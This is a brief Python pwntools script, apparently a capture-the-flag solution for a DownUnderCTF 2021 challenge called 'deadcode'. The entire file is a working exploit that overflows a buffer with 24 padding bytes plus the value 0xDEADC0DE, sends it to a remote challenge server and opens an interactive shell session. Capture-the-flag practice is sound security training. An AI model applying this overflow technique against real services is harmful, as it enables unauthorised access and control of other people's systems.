from pwn import * 

BIN = "./deadcode"

v5 = 0xDEADC0DE

def exploit():
	payload = b"a"*24 + p64(v5)
	io.recvuntil("What features would you like to see in my app?")
	io.sendline(payload)
	io.interactive()

#io = process(BIN)
io = remote("pwn-2021.duc.tf", 31916)
exploit()